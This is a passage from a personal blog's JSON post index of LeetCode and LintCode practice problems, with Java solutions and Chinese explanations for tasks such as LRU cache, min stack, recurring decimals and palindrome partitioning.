number. For example: 12345678A -&gt; 1B -&gt; 2C -&gt; 3...Z -&gt; 26AA -&gt; 27AB -&gt; 28 ... Example 1: 12Input: &quot;A&quot;Output: 1 Example 2: 12Input: &quot;AB&quot;Output: 28 Example 3: 12Input: &quot;ZY&quot;Output: 701 Java相当于把26进制数转换为10进制数字。从最低位到最高位依次转换，某一位的系数用addOn表示。 12345678910public int titleToNumber(String s) &#123; int res = 0; int n = s.length(); int addOn = 1; for (int i = 0; i &lt; n; i++) &#123; res += addOn*(s.charAt(n - i - 1) - 'A' + 1); addOn = addOn*26; &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"166. Fraction to Recurring Decimal","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-166-Fraction-to-Recurring-Decimal/","text":"Given two integers representing the numerator and denominator of a fraction, return the fraction in string format. If the fractional part is repeating, enclose the repeating part in parentheses. Example 1: 12Input: numerator = 1, denominator = 2Output: &quot;0.5&quot; Example 2: 12Input: numerator = 2, denominator = 1Output: &quot;2&quot; Example 3: 12Input: numerator = 2, denominator = 3Output: &quot;0.(6)&quot; Java这道题目涉及基本的数学，难点在于如何判断数字重复以及细节的处理。首先要注意正负号、0这样的细节，然后考虑到整数可能越界，所以统一转换为长整型long。判断数字重复关键在于判断余数的重复，所以我们可以将余数和余数的位置放在哈希表中，当余数重复时，确定重复区间，加上括号 1234567891011121314151617181920212223242526272829303132333435363738394041424344public String fractionToDecimal(int numerator, int denominator) &#123; // 处理0 if (numerator == 0) return \"0\"; StringBuilder sb = new StringBuilder(); HashMap&lt;Long, Integer&gt; map = new HashMap&lt;&gt;(); // 处理负数 boolean isPositive = numerator &lt; 0 == denominator &lt; 0; if (!isPositive) sb.append(\"-\"); long numeratorLong = Math.abs((long) numerator); long denominatorLong = Math.abs((long) denominator); // 整数部分 sb.append(numeratorLong / denominatorLong); long reminder = numeratorLong % denominatorLong; if (reminder == 0) return sb.toString(); // 小数部分 sb.append(\".\"); int index = sb.length(); while (reminder != 0) &#123; if (!map.containsKey(reminder)) &#123; // 放入分子和分子所在的位置 map.put(reminder, index++); &#125; else &#123; // 发现重复，在合适的位置加入括号, 并结束 sb.insert(map.get(reminder), \"(\"); sb.append(')'); break; &#125; // 添加商 reminder *= 10; sb.append(reminder / denominatorLong); // 更新余数 reminder %= denominatorLong; &#125; // end while return sb.toString(); &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"155. Min Stack","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-155-Min-Stack/","text":"Design a stack that supports push, pop, top, and retrieving the minimum element in constant time. push($x$) – Push element $x$ onto stack. pop() – Removes the element on top of the stack. top() – Get the top element. getMin() – Retrieve the minimum element in the stack. Example: 12345678MinStack minStack = new MinStack();minStack.push(-2);minStack.push(0);minStack.push(-3);minStack.getMin(); --&gt; Returns -3.minStack.pop();minStack.top(); --&gt; Returns 0.minStack.getMin(); --&gt; Returns -2. Java首先想到，在栈里面设置一个min变量，当栈push一个数时，和min比较，如果比他大，min不变，比他小，min更新。但是这样，pop了min之后就没有了min的数据了…… 也就是说，min这个数据，不只要维护当前的最小值，还要有之前的栈里面的数据信息。那么min这个数据应该和栈同步增长数据和减少数据，这样自然想到min应该也是一个栈。而且这个栈的栈顶应该是整个栈的最小值，这样，才能取出来。于是，很自然的想到，在datastack进行push(x)操作的时候，minstack要取出他的栈顶元素(最小值min)，和$x$进行比较，如果$x&gt;$min, minstack就push(min),否则，push(x); 1234567891011121314151617181920212223242526272829class MinStack &#123; private Stack&lt;Integer&gt; numStack, minStack; public MinStack() &#123; numStack = new Stack&lt;&gt;(); minStack = new Stack&lt;&gt;(); &#125; public void push(int x) &#123; numStack.push(x); if (minStack.isEmpty() || x &lt; minStack.peek()) minStack.push(x); else minStack.push(minStack.peek()); &#125; public void pop() &#123; if (numStack.isEmpty()) throw new IllegalArgumentException(\"Stack is empty\"); numStack.pop(); minStack.pop(); &#125; public int top() &#123; return numStack.peek(); &#125; public int getMin() &#123; return minStack.peek(); &#125;&#125; 一种优化的办法，就是每次push(x)的时候，都比较min和$x$的大小，如果$x&gt;$min, minstack不进行操作;否则，对于minstack进行push(x)的操作。这样相应的pop()操作也要改变。每次pop()的时候，都要检查pop()出来的值$x$是否大于min：如果是，则minstack不进行操作，如果$x=$min,那么对minstack进行pop()操作。这样，对于minstack的存储空间有一定的降低。 12345678910111213141516171819202122232425262728class MinStack &#123; private Stack&lt;Integer&gt; numStack, minStack; public MinStack() &#123; numStack = new Stack&lt;&gt;(); minStack = new Stack&lt;&gt;(); minStack.push(Integer.MAX_VALUE); &#125; public void push(int x) &#123; // 注意：是&lt;=，而不是&lt;。当最小元素重复的时候，需要入栈 if (x &lt;= minStack.peek()) minStack.push(x); numStack.push(x); &#125; public void pop() &#123; // 特别注意：使用equals而不是== if (numStack.pop().equals(minStack.peek())) minStack.pop(); &#125; public int top() &#123; return numStack.peek(); &#125; public int getMin() &#123; return minStack.peek(); &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"151. Reverse Words in a String","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-151-Reverse-Words-in-a-String/","text":"Given an input string, reverse the string word by word. Example: 12Input: &quot;the sky is blue&quot;,Output: &quot;blue is sky the&quot;. Note: A word is defined as a sequence of non-space characters. Input string may contain leading or trailing spaces. However, your reversed string should not contain leading or trailing spaces. You need to reduce multiple spaces between two words to a single space in the reversed string. Follow up: For C programmers, try to solve it in-place in $O(1)$ space. Java这道题目如果用Python写的话很方便，如果要分割字符串，要用到String.split()函数，但是这个函数只接受正则表达式！摔！气死！ 用空格分割字符串的方法是String.split(\\\\s+),\\s表示空格。 12345678public String reverseWords(String s) &#123; String[] list = s.trim().split(\"\\\\s+\"); StringBuilder res = new StringBuilder(); for (int i = list.length - 1; i &gt; 0; i--) res.append(list[i]).append(\" \"); res.append(list[0]); return res.toString();&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"150. Evaluate Reverse Polish Notation","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-150-Evaluate-Reverse-Polish-Notation/","text":"Evaluate the value of an arithmetic expression in Reverse Polish Notation. Valid operators are +, -, *, /. Each operand may be an integer or another expression. Note: Division between two integers should truncate toward zero. The given RPN expression is always valid. That means the expression would always evaluate to a result and there won’t be any divide by zero operation. Example 1: 123Input: [&quot;2&quot;, &quot;1&quot;, &quot;+&quot;, &quot;3&quot;, &quot;*&quot;]Output: 9Explanation: ((2 + 1) * 3) = 9 Example 2: 123Input: [&quot;4&quot;, &quot;13&quot;, &quot;5&quot;, &quot;/&quot;, &quot;+&quot;]Output: 6Explanation: (4 + (13 / 5)) = 6 Example 3: 12345678910Input: [&quot;10&quot;, &quot;6&quot;, &quot;9&quot;, &quot;3&quot;, &quot;+&quot;, &quot;-11&quot;, &quot;*&quot;, &quot;/&quot;, &quot;*&quot;, &quot;17&quot;, &quot;+&quot;, &quot;5&quot;, &quot;+&quot;]Output: 22Explanation: ((10 * (6 / ((9 + 3) * -11))) + 17) + 5= ((10 * (6 / (12 * -11))) + 17) + 5= ((10 * (6 / -132)) + 17) + 5= ((10 * 0) + 17) + 5= (0 + 17) + 5= 17 + 5= 22 Java这道题目直接用Stack就可以了。唯一需要注意的就是在做除法和减法的时候，注意前后两个数字的顺序。 1234567891011121314151617181920212223242526272829303132/** * https://leetcode.com/problems/evaluate-reverse-polish-notation/description/ * Evaluate the value of an arithmetic expression in Reverse Polish Notation. */public class Q150EvaluateReversePolishNotation &#123; public int evalRPN(String[] tokens) &#123; Stack&lt;Integer&gt; numberStack = new Stack&lt;&gt;(); Integer dummy; for (String token : tokens) &#123; switch (token) &#123; case &quot;+&quot;: numberStack.push(numberStack.pop() + numberStack.pop()); break; case &quot;-&quot;: numberStack.push(-numberStack.pop() + numberStack.pop()); break; case &quot;*&quot;: numberStack.push(numberStack.pop() * numberStack.pop()); break; case &quot;/&quot;: dummy = numberStack.pop(); numberStack.push(numberStack.pop() / dummy); break; default: numberStack.push(Integer.parseInt(token)); &#125; // end switch &#125; // end for return numberStack.pop(); &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"149. Max Points on a Line","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-149-Max-Points-on-a-Line/","text":"Given $n$ points on a 2D plane, find the maximum number of points that lie on the same straight line. Example 1: 12345678910Input: [[1,1],[2,2],[3,3]]Output: 3Explanation:^|| o| o| o +-------------&gt;0 1 2 3 4 Example 2: 1234567891011Input: [[1,1],[3,2],[5,3],[4,1],[2,3],[1,4]]Output: 4Explanation:^|| o| o o| o| o o+-------------------&gt;0 1 2 3 4 5 6 Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"146. LRU Cache","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-146-LRU-Cache/","text":"Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and put. get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1. put(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item. Follow up: Could you do both operations in $O(1)$ time complexity? Example: 1234567891011LRUCache cache = new LRUCache( 2 /* capacity */ );cache.put(1, 1);cache.put(2, 2);cache.get(1); // returns 1cache.put(3, 3); // evicts key 2cache.get(2); // returns -1 (not found)cache.put(4, 4); // evicts key 1cache.get(1); // returns -1 (not found)cache.get(3); // returns 3cache.get(4); // returns 4 Java涉及最近最不常使用缓存。这道题目挺难的，因为LRUCache的存取的时间复杂度必须为$O(1)$。一种常见的做法是将哈希表和双向链表结合起来。对于put(key, value)操作，将对应键key和包含该键值对的双向链表节点ListNode(key, value)加入到哈希表中，实现了键和链表节点的一一对应。使用双向链表的原因是，双向链表的插入、删除比较简单，由于缓存使用最近最不常使用(LRU)算法，那么可以将访问过的节点，放到链表首部，永远将节点插入链表首部。为了方便插入和删除，在开始时，加入虚拟的头部、尾部。当链表中元素大于规定的容量时，自动删除链表尾部元素。对于get(key)操作，通过哈希表中获取链表节点，得到对应的值，然后将该链表节点移动到链表头部。 也就是链表维护了LRU的顺序，始终将刚访问过的键值对放在前面，将最近不访问的键值对放在后面。而哈希表维护了键和链表节点的对应关系，可以通过键找到节点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107class LRUCache &#123; private Map&lt;Integer, ListNode&gt; cache; private int size; private int capacity; private ListNode head, tail; public LRUCache(int capacity) &#123; cache = new HashMap&lt;&gt;(); size = 0; this.capacity = capacity; head = new ListNode(); tail = new ListNode(); head.next = tail; tail.prev = head; &#125; public int get(int key) &#123; ListNode node = cache.get(key); if (node == null) return -1; // should raise exception here. // move the accessed node to the head; afterNodeAccess(node); return node.val; &#125; public void put(int key, int value) &#123; ListNode node = cache.get(key); if (node == null) &#123; ListNode newNode = new ListNode(key, value); cache.put(key, newNode); size++; insertNode(newNode); &#125; else &#123; // update the val. node.val = value; afterNodeAccess(node); &#125; &#125; /** * Always add the new node right after head; */ private void insertNode(ListNode node) &#123; node.prev = head; node.next = head.next; head.next.prev = node; head.next = node; if (size &gt; capacity) &#123; // pop the tail ListNode tail = removeNode(); cache.remove(tail.key); size--; &#125; &#125; /** * Remove an existing node from the linked list. */ private void removeNode(ListNode node) &#123; ListNode pre = node.prev; ListNode post = node.next; pre.next = post; post.prev = pre; &#125; /** * Move certain node in between to the head. */ private void afterNodeAccess(ListNode node) &#123; removeNode(node); insertNode(node); &#125; // pop the current tail. private ListNode removeNode() &#123; ListNode res = tail.prev; removeNode(res); return res; &#125; static class ListNode &#123; int key; int val; ListNode prev; ListNode next; ListNode(int key, int val)&#123; this.key = key; this.val = val; &#125; ListNode() &#123; this(0, 0); &#125; &#125;&#125; 对于Java来说，有方便的解决方案。LinkedHashMap是HashMap的子类，但内部还有一个双向链表维持键值对的顺序。键值对可以是插入顺序，也可以是访问顺序。如果是访问顺序，其实就是LRU Cache。 123456789101112131415161718public class LRUCache extends LinkedHashMap&lt;Integer, Integer&gt; &#123; private final int CAPACITY; public LRUCache(int capacity) &#123; super(capacity, 0.75f, true); this.CAPACITY = capacity; &#125; public int get(int key) &#123; return super.getOrDefault(key, -1); &#125; public void put(int key, int value) &#123; super.put(key, value); &#125; @Override protected boolean removeEldestEntry(Map.Entry eldest) &#123; return size() &gt; CAPACITY; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"57. Insert Interval","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-57-Insert-Interval/","text":"Given a set of non-overlapping intervals, insert a new interval into the intervals (merge if necessary). You may assume that the intervals were initially sorted according to their start times. Example 1: 12Input: intervals = [[1,3],[6,9]], newInterval = [2,5]Output: [[1,5],[6,9]] Example 2: 123Input: intervals = [[1,2],[3,5],[6,7],[8,10],[12,16]], newInterval = [4,8]Output: [[1,2],[3,10],[12,16]]Explanation: Because the new interval [4,8] overlaps with [3,5],[6,7],[8,10]. Java插入区间。这道题目是56. Merge Intervals的升级版，其实换汤不换药。把区间插入到正确位置，然后再merge即可。或者直接插入，然后排序，然后再merge。 12345678910111213141516171819202122232425262728293031public List&lt;Interval&gt; insert(List&lt;Interval&gt; intervals, Interval newInterval) &#123; // special case: interval is empty if (intervals == null || intervals.size() == 0) return Collections.singletonList(newInterval); int n = intervals.size(); // special case: add newInterval to the end of intervals if (newInterval.start &gt; intervals.get(n - 1).end) &#123; intervals.add(newInterval); return intervals; &#125; // special case: add newInterval to the beginning of intervals if (newInterval.end &lt; intervals.get(0).start) &#123; intervals.add(0, newInterval); return intervals; &#125; // general case: add newInterval to the middle of intervals; int i = 0; while (i &lt; n &amp;&amp; newInterval.start &gt; intervals.get(i).start) i++; intervals.add(i, newInterval); return merge(intervals);&#125; private List&lt;Interval&gt; merge(List&lt;Interval&gt; intervals) &#123; LinkedList&lt;Interval&gt; merged = new LinkedList&lt;&gt;(); merged.add(intervals.get(0)); for (Interval interval: intervals.subList(1, intervals.size())) if (merged.getLast().end &lt; interval.start) merged.add(interval); else if (merged.getLast().end &lt; interval.end) merged.getLast().end = interval.end; return merged;&#125; 最好的办法就是只merge部分区间， 123456789101112131415161718public List&lt;Interval&gt; insert(List&lt;Interval&gt; intervals, Interval newInterval) &#123; List&lt;Interval&gt; result = new ArrayList&lt;&gt;(); int n = intervals.size(), i = 0; // add all the intervals ending before newInterval starts while (i &lt; n &amp;&amp; intervals.get(i).end &lt; newInterval.start) result.add(intervals.get(i++)); // merge all overlapping intervals to one considering newInterval while (i &lt; n &amp;&amp; intervals.get(i).start &lt;= newInterval.end) &#123; newInterval = new Interval( // we could mutate newInterval here also Math.min(newInterval.start, intervals.get(i).start), Math.max(newInterval.end, intervals.get(i).end)); i++; &#125; result.add(newInterval); // add the union of intervals we got // add all the rest while (i &lt; n) result.add(intervals.get(i++)); return result;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"138. Copy List with Random Pointer","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-138-Copy-List-with-Random-Pointer/","text":"A linked list is given such that each node contains an additional random pointer which could point to any node in the list or null. Return a deep copy of the list. Definition for singly-linked list with a random pointer. 12345class RandomListNode &#123; int label; RandomListNode next, random; RandomListNode(int x) &#123; this.label = x; &#125;&#125;; Java复制带随机指针的链表。第一种方法可以借鉴LeetCode133 Clone Graph: 从head开始遍历链表 如果链表的节点是未曾访问的，复制该节点，并放入哈希表中 如果链表的节点已经被访问过，则从哈希表中取出该节点 让random和next指向正确的节点 该方法的时间和空间复杂度是$O(n)。 1234567891011121314public RandomListNode copyRandomList(RandomListNode head) &#123; Map&lt;Integer, RandomListNode&gt; map = new HashMap&lt;&gt;(); return copyRandomList(map, head);&#125;private RandomListNode copyRandomList(Map&lt;Integer, RandomListNode&gt; map, RandomListNode head) &#123; if (head == null) return null; if (map.containsKey(head.label)) return map.get(head.label); RandomListNode newHead = new RandomListNode(head.label); map.put(head.label, newHead); newHead.next = copyRandomList(map, head.next); newHead.random = copyRandomList(map, head.random); return newHead;&#125; 上面的方法是比较通用的方法，把链表看成是图的一种，但是没有利用到链表的特性。 为了方便的寻找到新创建的节点，可以将新创建(复制)的节点放置于原节点之后，使原始节点和复制节点交错分布： 向前遍历链表，将复制节点放置于原节点之后 将复制节点的random指向正确的位置 分离链表 1234567891011121314151617181920212223242526272829303132333435363738public RandomListNode copyRandomList(RandomListNode head) &#123; if (head == null) return null; // 遍历链表，复制节点，形成原节点和复制节点的交错分布 RandomListNode originalNode = head; RandomListNode clonedNode; while (originalNode != null) &#123; // 创建新节点 clonedNode = new RandomListNode(originalNode.label); // 指向正确位置 clonedNode.next = originalNode.next; originalNode.next = clonedNode; // 前进一个节点 originalNode = clonedNode.next; &#125; // 遍历链表，使ranom指针指向正确位置 originalNode = head; while (originalNode != null) &#123; // random可能是null，由于originalNode.next.random默认是null，所以不设置 if (originalNode.random != null) originalNode.next.random = originalNode.random.next; originalNode = originalNode.next.next; &#125; // 分离链表 originalNode = head; clonedNode = originalNode.next; RandomListNode clonedHead = clonedNode; while (originalNode.next.next != null) &#123; originalNode.next = clonedNode.next; originalNode = originalNode.next; clonedNode.next = originalNode.next; clonedNode = clonedNode.next; &#125; // 结束原链表 originalNode.next = null; return clonedHead;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"164. Maximum Gap","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-164-Maximum-Gap/","text":"Given an unsorted array, find the maximum difference between the successive elements in its sorted form. Return 0 if the array contains less than 2 elements. Example 1: 1234Input: [3,6,9,1]Output: 3Explanation: The sorted form of the array is [1,3,6,9], either (3,6) or (6,9) has the maximum difference 3. Example 2: 123Input: [10]Output: 0Explanation: The array contains less than 2 elements, therefore return 0. Note: You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range. Try to solve it in linear time/space. Java最大间距。最直接的方法就是一五一十的按照题目描述的做：先排序，然后看看相邻元素的最大间距。 12345678public int maximumGap(int[] nums) &#123; if (nums == null || nums.length &lt; 2) return 0; Arrays.sort(nums); int maxGap = -1; for (int i = 1; i &lt; nums.length; i++) maxGap = Math.max(maxGap, Math.abs(nums[i] - nums[i - 1])); return maxGap;&#125; 第二种巧妙的方法使用基数排序。 还有一种方法就是使用桶排序。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"464. Sort Integers II","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/LintCode-464-Sort-Integers-II/","text":"Given an integer array, sort it in ascending order. Use quick sort, merge sort, heap sort or any $O(nlogn)$ algorithm.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Quick Sort","slug":"Quick-Sort","permalink":"http://larryim.cc/tags/Quick-Sort/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Merge Sort","slug":"Merge-Sort","permalink":"http://larryim.cc/tags/Merge-Sort/"}],"categories":[{"name":"LintCode","slug":"LintCode","permalink":"http://larryim.cc/categories/LintCode/"}]},{"title":"132. Palindrome Partitioning II","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-132-Palindrome-Partitioning-II/","text":"Given a string $s$, partition $s$ such that every substring of the partition is a palindrome. Return the minimum cuts needed for a palindrome partitioning of $s$. Example: 123Input: &quot;aab&quot;Output: 1Explanation: The palindrome partitioning [&quot;aa&quot;,&quot;b&quot;] could be produced using 1 cut. Java","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"131. Palindrome Partitioning","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-131-Palindrome-Partitioning/","text":"Given a string $s$, partition $s$ such that every substring of the partition is a palindrome. Return all possible palindrome partitioning of $s$. Example: 123456Input: &quot;aab&quot;Output:[ [&quot;aa&quot;,&quot;b&quot;], [&quot;a&quot;,&quot;a&quot;,&quot;b&quot;]] Java比较规矩的回溯法的问题。注意细节即可。 12345678910111213141516171819202122232425262728private List&lt;List&lt;String&gt;&gt; res;public List&lt;List&lt;String&gt;&gt; partition(String s) &#123; res = new ArrayList&lt;&gt;(); partitionHelper(new ArrayList&lt;&gt;(), s); return res;&#125; private void partitionHelper(ArrayList&lt;String&gt; list, String s) &#123; if (s.length() == 0) &#123;res.add(list); return; &#125; int i = 1, n = s.length(); while (i &lt;= n) &#123; String sub = s.substring(0, i); if (!isValidPalindrome(sub)) &#123;i++; continue;&#125; list.add(sub); partitionHelper((ArrayList&lt;String&gt;) list.clone(), s.substring(i, n)); list.remove(list.size() - 1); i++; &#125;&#125; private boolean isValidPalindrome(String s) &#123; if (s == null) return false; int left = 0, right = s.length() - 1; while (left &lt;= right) if (s.charAt(left++) != s.charAt(right--)) return false; return true;&#125;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"130. Surrounded Regions","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-130-Surrounded-Regions/","text":"Given a 2D board containing &#39;X&#39; and &#39;O&#39; (the letter O), capture all regions surrounded by &#39;X&#39;. A region is captured by flipping all &#39;O&#39;s into &#39;X&#39;s in that surrounded region. Example: 1234X X X XX O O XX X O XX O X X After running your function, the board should be: 1234X X X XX X X XX X X XX O X X Explanation: Surrounded regions shouldn’t be on the border, which means that any &#39;O&#39; on the border of the board are not flipped to &#39;X&#39;. Any &#39;O&#39; that is not on the border and it is not connected to an &#39;O&#39; on the border will be flipped to &#39;X&#39;. Two cells are connected if they are adjacent cells connected horizontally or vertically. Java这道题其实思路是非常简单的：把二维数组放在UnionFind集合中，当出现’O’时，将’O’附近的’O’连接起来，形成connected component. 那么怎么判断’O’是否被围起来了呢？这里采用在原来数组外增加一圈’O’的方法，只需判断该’O’是否和外圈的’O’连接，来判断’O’是否被围起来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class Q130SurroundedRegions &#123; public static void solve(char[][] board) &#123; // corner case if (board.length &lt; 3) &#123; return; &#125; int n = board.length; int m = board[0].length; // corner case if ( m &lt; 3) return; // add virtual points surronds board int nn = n + 2, mm = m + 2; char[][] virtualBoard = new char[nn][mm]; for (int i = 0; i &lt; nn; i++) &#123; for (int j = 0; j &lt; mm; j++) &#123; if (i == 0 || j == 0 || j == mm - 1 || i == nn - 1) &#123; virtualBoard[i][j] = 'O'; &#125; else &#123; virtualBoard[i][j] = board[i-1][j-1]; &#125; &#125; &#125; // add union find data structure, 0 as virtual point WeightedPathCompressionQuickFind uf = new WeightedPathCompressionQuickFind(nn*mm); int index; for (int i = 0; i &lt; nn; i++) &#123; for (int j = 0; j &lt; mm; j++) &#123; index = i * mm + j; if (virtualBoard[i][j] == 'O') &#123; // find adject 'O' if ((j &gt; 0) &amp;&amp; (virtualBoard[i][j-1] == 'O')) &#123; //left uf.union(index, index - 1); &#125; if ((j &lt; m - 1) &amp;&amp; (virtualBoard[i][j + 1] == 'O')) &#123; // right uf.union(index, index + 1); &#125; if ((i &gt; 0) &amp;&amp; (virtualBoard[i-1][j] == 'O')) &#123; // top uf.union(index, index - mm); &#125; if ((i &lt; n - 1) &amp;&amp; (virtualBoard[i+1][j] == 'O')) &#123; // bottom uf.union(index, index + mm); &#125; &#125; &#125; &#125; // flip it if 'O' is captured, for (int i = 1; i &lt; n - 1; i++) &#123; for (int j = 1; j &lt; m - 1; j++) &#123; index = (i + 1) * mm + (j + 1); // index on virtual board if ((board[i][j] == 'O') &amp;&amp; (!uf.connected(0, index))) &#123; board[i][j] = 'X'; &#125; &#125; &#125; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Union Find","slug":"Union-Find","permalink":"http://larryim.cc/tags/Union-Find/"},{"name":"Depth-First Search","slug":"Depth-First-Search","permalink":"http://larryim.cc/tags/Depth-First-Search/"},{"name":"Breath-First Search","slug":"Breath-First-Search","permalink":"http://larryim.cc/tags/Breath-First-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"119. Pascal's Triangle II","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-119-Pascal-s-Triangle-II/","text":"Given a non-negative index $k$ where $k \\le 33$, return the $k^{th}$ index row of the Pascal’s triangle. Note that the row index starts from 0. In Pascal’s triangle, each number is the sum of the two numbers directly above it. Example: 12Input: 3Output: [1,3,3,1] Follow up: Could you optimize your algorithm to use only $O(k)$ extra space? Java一开始写的笨办法，保存需要求和的两个值，轮流更新。 1234567891011121314public List&lt;Integer&gt; getRow(int rowIndex) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); int prev = 1, before = 1; for (int i = 0; i &lt;= rowIndex; i++) &#123; res.add(1); for (int j = 0; j &lt;= i; j++) &#123; prev = res.get(j); if (!(j == 0 || j == i)) res.set(j, prev + before); before = prev; &#125; &#125; return res;&#125; 比较好的办法是内循环从后往前面遍历，保证了值没有被覆盖掉。 row0 = 1 row1 = (row0[0]), (row1[1] + row0[0]) = 1, 1 row2 = (row0[0]), (row1[1] + row1[0]), (row2[2] + row1[1]) = 1, 2, 1 row3 = (row0[0]), (row2[1] + row2[0]), (row2[2] + row2[1]). (row3[3] + row2[2]) = 1, 3, 3, 1 12345678910public List&lt;Integer&gt; getRow(int rowIndex) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(rowIndex + 1); res.add(1); for (int i = 1; i &lt;= rowIndex; i++) &#123; res.add(0); for (int j = i; j &gt;= 1; j--) res.set(j, res.get(j) + res.get(j - 1)); &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"1. Two Sum","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-1-Two-Sum/","text":"Given an array of integers, return indices of the two numbers such that they add up to a specific target. You may assume that each input would have exactly one solution, and you may not use the same element twice. Example: 123Given nums = [2, 7, 11, 15], target = 9,Because nums[0] + nums[1] = 2 + 7 = 9,return [0, 1]. Java使用哈希表，当遍历数组的时候，把数组元素的互补target - 